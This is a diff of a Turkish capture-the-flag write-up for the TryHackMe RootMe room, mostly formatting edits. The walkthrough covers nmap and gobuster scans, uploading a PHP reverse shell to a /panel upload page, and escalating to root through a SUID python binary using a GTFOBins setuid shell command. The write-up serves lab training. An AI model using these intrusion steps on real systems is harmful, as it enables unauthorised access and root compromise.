@@ -2,7 +2,7 @@
 ---
 Selam Dostlar RootMe ctf çözümüyle karsınızdayım.
 
-`nmap -sC -sV <İP> -Pn`
+>nmap -sC -sV <İP> -Pn
 
 ```sh
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-02 03:14 EDT
@@ -36,7 +36,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ile dizin taraması yapıyoruz.
 
 
-`gobuster dir -u http://10.10.214.100 -w /usr/share/dirb/wordlists/common.txt`
+>gobuster dir -u <İP> -w /usr/share/dirb/wordlists/common.txt
 
 ```sh
 /.hta (Status: 403)
@@ -54,8 +54,8 @@ ile dizin taraması yapıyoruz.
 
 ##### Bize Verilen çıktıyı inceliyoruz:
 --------
-Status:403 olarak belirtilen dizinler erisim yetkimizin `olmadığı` dizinler
-Status:301 olarak belirttiği dizinler erisim yetkimizin `oldugu` dizinler
+>Status:403 olarak belirtilen dizinler erisim yetkimizin `olmadığı` dizinler
+>Status:301 olarak belirttiği dizinler erisim yetkimizin `oldugu` dizinler
 
 ##### Erisim yetkimizin olduğu dizinleri inceliyoruz:
 ------
@@ -65,13 +65,13 @@ Status:301 olarak belirttiği dizinler erisim yetkimizin `oldugu` dizinler
 /panel dizininde bizi dosya yükleyebileceğimiz bir sayfa karşılıyor.
 /uploads dizini yüklenen dosyaların bulunduğu dizin
 ```
-##### Php reverse shell indirmek ve düzenliyoruz:
+##### Php reverse shell indirmek ve düzenlemek:
 ----
-~Reverse Shelli [buradan](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) indirebilirsiniz.
+Reverse Shelli [buradan](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) indirebilirsiniz.
 ```
-Php reverse shelli açıp tun0 ipimizi ve dinleyeceğimiz portu yazıyoruz.
+Php reverse shelli açıp tun0 ipimizi ve dinleycek portumuzu yazıyoruz.
 ```
-##### php reverse shelli /panel adresine yüklüyoruz:
+##### php reverse shelli /panel adresine yüklemek:
 --------
 ```
 Php reverse shell yüklemeye çalışıyoruz ama hata veriyor.`
@@ -89,21 +89,21 @@ Ve Bağlantı Geliyor
 ```
 ##### User flagı buluyoruz:
 ------
-`Hemen bulunduğumuz dizine ls çekiyoruz ve user flagı okuyoruz:`
+>Hemen bulunduğumuz dizine ls çekiyoruz ve user flagı okuyoruz:`
 
 ```
 $ cat user.txt
 THM{xxxxxxxxxxxxxxx}
 ```
 
-##### Yetki Yükseltiyoruz:
+##### Yetki Yükseltmek:
 ---
 ```
 find / -user root -perm /4000 2>/dev/null
 ```
-`komutu ile root olarak kullanbileceğimiz progrmaları listeliyoruz.`
-`/usr/bin/python ı görüyoruz ve bunla yetki yükseltmeye çalışıyoruz.`
-
+komutu ile root olarak kullanbileceğimiz progrmaları listeliyoruz.
+/usr/bin/python ı görüyoruz ve bunla yetki yükseltmeye çalışıyoruz.
+```
 [GTFOBins](https://gtfobins.github.io/) adresinde pythonu aratıyor ve python yetki yükseltme komutunu buluyoruz:
 ```
 -c 'import os; os.setuid(0); os.system("/bin/sh")'
